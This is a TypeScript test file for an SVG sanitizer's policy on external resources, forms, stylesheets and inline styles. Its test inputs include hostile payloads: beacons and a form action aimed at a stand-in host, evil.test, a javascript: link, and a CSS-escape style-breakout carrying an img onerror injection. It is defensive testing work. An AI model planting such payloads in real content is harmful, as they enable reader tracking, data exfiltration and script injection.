/**
 * Integration tests for `sanitizeSvg`'s external-resource policy.
 *
 * The unit-level rules live in `svgResourcePolicy.test.ts`; these run the
 * real DOMPurify pipeline, which is where element-awareness and the
 * foreignObject HTML profile actually interact.
 */
import { describe, it, expect } from "vitest";
import { sanitizeSvg } from "./svgSanitize";

describe("sanitizeSvg — external resource references must not phone home", () => {
  // `use`/`image` are allowed for Mermaid, which only ever references
  // SAME-DOCUMENT fragments. An external target is a load-on-open beacon
  // (reader IP + open time) from an untrusted diagram.
  it("strips an external https href from use", () => {
    expect(sanitizeSvg('<svg><use href="https://evil.test/x.svg#y"/></svg>')).not.toContain(
      "evil.test",
    );
  });

  it("strips an external xlink:href from use", () => {
    expect(
      sanitizeSvg('<svg><use xlink:href="https://evil.test/x.svg#y"/></svg>'),
    ).not.toContain("evil.test");
  });

  it("strips an external href from image", () => {
    expect(sanitizeSvg('<svg><image href="https://evil.test/p.png"/></svg>')).not.toContain(
      "evil.test",
    );
  });

  it("strips a protocol-relative href", () => {
    expect(sanitizeSvg('<svg><image href="//evil.test/p.png"/></svg>')).not.toContain(
      "evil.test",
    );
  });

  it("strips an external src on HTML inside foreignObject", () => {
    // HTML inside <foreignObject> reaches this sanitizer too — the same
    // beacon by another spelling. Missed by the first version of the policy,
    // which only inspected href/xlink:href.
    expect(
      sanitizeSvg(
        '<svg><foreignObject><img src="https://evil.test/p.png"></foreignObject></svg>',
      ),
    ).not.toContain("evil.test");
  });

  it("strips an external poster on media inside foreignObject", () => {
    expect(
      sanitizeSvg(
        '<svg><foreignObject><video poster="https://evil.test/p.png"></video></foreignObject></svg>',
      ),
    ).not.toContain("evil.test");
  });

  it("strips an external url() from a paint attribute", () => {
    expect(sanitizeSvg('<svg><rect fill="url(https://evil.test/p.svg)"/></svg>')).not.toContain(
      "evil.test",
    );
  });

  it("strips an external url() from a style value", () => {
    expect(
      sanitizeSvg('<svg><rect style="fill:url(https://evil.test/p.svg)"/></svg>'),
    ).not.toContain("evil.test");
  });

  it("keeps a same-document fragment reference (Mermaid markers)", () => {
    expect(sanitizeSvg('<svg><use href="#arrowhead"/></svg>')).toContain('href="#arrowhead"');
  });

  it("keeps a same-document url() paint server (gradients)", () => {
    expect(sanitizeSvg('<svg><rect fill="url(#gradient)"/></svg>')).toContain("url(#gradient)");
  });

  it("keeps an inline data:image reference", () => {
    expect(
      sanitizeSvg('<svg><image href="data:image/png;base64,iVBORw0KGgo="/></svg>'),
    ).toContain("data:image/png");
  });

  it("keeps an ordinary link — navigation is not a fetch (Mermaid click directives)", () => {
    // Stripping these was a regression: a `click` directive renders
    // <a xlink:href="https://…">, which the reader must activate. DOMPurify's
    // URI policy still blocks javascript: there (asserted below).
    const result = sanitizeSvg(
      '<svg><a xlink:href="https://example.com"><text>label</text></a></svg>',
    );
    expect(result).toContain("example.com");
  });

  it("still blocks a javascript: link", () => {
    expect(
      sanitizeSvg('<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>'),
    ).not.toContain("javascript:");
  });
});

// WI-RA8.1 — a form in a diagram posts to whatever the document named.
describe("sanitizeSvg — a diagram cannot carry a form", () => {
  const form =
    '<svg><foreignObject><form action="https://evil.test/collect" method="post">' +
    '<input name="q" value="1"><button>Go</button></form></foreignObject></svg>';

  it("removes the form element and the address it would post to", () => {
    const out = sanitizeSvg(form);
    expect(out).not.toMatch(/<form/i);
    expect(out).not.toContain("evil.test");
  });

  it("keeps what was inside it — the content is not the danger", () => {
    const out = sanitizeSvg(form);
    expect(out).toContain("<button>Go</button>");
    expect(out).toContain('<input name="q"');
  });

  it.each(["FORM", "Form", "fOrM"])("removes it however the tag is cased (%s)", (tag) => {
    const out = sanitizeSvg(
      `<svg><foreignObject><${tag} action="https://evil.test/c">x</${tag}></foreignObject></svg>`,
    );
    expect(out).not.toMatch(/<form/i);
    expect(out).toContain("x");
  });

  it("removes a button's own posting address and its link to a form elsewhere", () => {
    const out = sanitizeSvg(
      '<svg><foreignObject><button form="app-form" formaction="https://evil.test/b">Go</button></foreignObject></svg>',
    );
    expect(out).not.toContain("formaction");
    expect(out).not.toContain("app-form");
  });
});

describe("sanitizeSvg — stylesheet content", () => {
  it("strips a remote @import from a <style> element", () => {
    // The attribute hook never sees this: the payload is element TEXT.
    expect(
      sanitizeSvg('<svg><style>@import url("https://evil.test/x.css");</style><rect/></svg>'),
    ).not.toContain("evil.test");
  });

  it("strips an external url() from a stylesheet rule", () => {
    expect(
      sanitizeSvg("<svg><style>rect{fill:url(https://evil.test/p.svg)}</style></svg>"),
    ).not.toContain("evil.test");
  });

  it("keeps ordinary Mermaid theming", () => {
    const out = sanitizeSvg(
      "<svg><style>.node rect{fill:#eee;stroke:#333}</style><rect/></svg>",
    );
    // Re-serialized from the parsed sheet, so the spelling is the parser's.
    expect(out).toMatch(/fill:\s*(#eee|rgb\(238, 238, 238\))/);
  });
});

// WI-RA8.2 — the stylesheet and the SVG it styles are tied together by a scope
// attribute only the sanitizer writes.
describe("sanitizeSvg — stylesheet scope", () => {
  const ATTR = "data-vmark-svg-scope";

  function parse(out: string) {
    const doc = new DOMParser().parseFromString(out, "text/html");
    const root = doc.querySelector("svg")!;
    const key = root.getAttribute(ATTR);
    return { doc, root, key, styleText: doc.querySelector("style")?.textContent ?? "" };
  }

  it("marks the root and confines every rule to it", () => {
    const { key, styleText } = parse(sanitizeSvg("<svg><style>body *{visibility:hidden}</style><rect/></svg>"));
    expect(key).toMatch(/^[a-z0-9]+$/);
    expect(styleText).toContain(`:is([${ATTR}="${key}"], [${ATTR}="${key}"] *):is(body *)`);
  });

  it("gives every sanitize call its own scope", () => {
    const input = "<svg><style>rect{fill:red}</style><rect/></svg>";
    expect(parse(sanitizeSvg(input)).key).not.toBe(parse(sanitizeSvg(input)).key);
  });

  it("marks only the outermost svg", () => {
    const { doc, root } = parse(
      sanitizeSvg("<svg><style>rect{fill:red}</style><g><svg><rect/></svg></g></svg>"),
    );
    expect(root.hasAttribute(ATTR)).toBe(true);
    expect(doc.querySelectorAll(`[${ATTR}]`)).toHaveLength(1);
  });

  it("ignores a scope attribute the document wrote itself", () => {
    const out = sanitizeSvg(`<svg><rect ${ATTR}="spoof"/><g ${ATTR}="1"></g></svg>`);
    expect(out).not.toContain(ATTR);
  });

  it("leaves an SVG with no stylesheet exactly as it was", () => {
    expect(sanitizeSvg('<svg viewBox="0 0 1 1"><rect fill="red"/></svg>')).toBe(
      '<svg viewBox="0 0 1 1"><rect fill="red"></rect></svg>',
    );
  });

  it("removes a stylesheet that has nothing left once confined", () => {
    expect(sanitizeSvg("<svg><style>@font-face{font-family:x}</style><rect/></svg>")).not.toMatch(/<style/i);
  });

  // Every `<` and `>` below is a CSS escape, so the HTML parser sees no tag;
  // only resolving the escapes would write `</style><img …>` into the sheet.
  // An HTML <style> (inside foreignObject) is raw text when serialized, so
  // that text would close it.
  it.each([
    ["an SVG <style>", (css: string) => `<svg><style>${css}</style></svg>`],
    [
      "an HTML <style> inside foreignObject",
      (css: string) => `<svg><foreignObject><style>${css}</style></foreignObject></svg>`,
    ],
  ])("cannot make %s close itself", (_label, wrap) => {
    const out = sanitizeSvg(
      wrap('[title="\\3c /style\\3e \\3c img src=x onerror=alert(1)\\3e "]{fill:red}'),
    );
    const reparsed = new DOMParser().parseFromString(out, "text/html");
    expect(reparsed.querySelector("img")).toBeNull();
    expect(out).not.toContain("onerror");
  });

  it("scopes a stylesheet inside foreignObject HTML too", () => {
    const { key, styleText } = parse(
      sanitizeSvg("<svg><foreignObject><style>body{display:none}</style><div>x</div></foreignObject></svg>"),
    );
    expect(styleText).toContain(`:is([${ATTR}="${key}"], [${ATTR}="${key}"] *):is(body)`);
  });
});

describe("sanitizeSvg — style attribute safety", () => {
  it("strips position:fixed from an SVG style attribute", () => {
    // A full-viewport overlay drawn by an untrusted diagram.
    expect(sanitizeSvg('<svg><rect style="position:fixed;top:0"/></svg>')).not.toContain(
      "fixed",
    );
  });

  it("strips it when written with a CSS comment or escape", () => {
    expect(sanitizeSvg('<svg><rect style="position:fixed/**/"/></svg>')).not.toContain(
      "fixed",
    );
    expect(sanitizeSvg('<svg><rect style="position:f\\ixed"/></svg>')).not.toContain(
      "ixed",
    );
  });

  it("keeps ordinary inline styling Mermaid relies on", () => {
    const out = sanitizeSvg('<svg><rect style="fill:#eee;stroke:#333"/></svg>');
    expect(out).toContain("fill:#eee");
  });
});
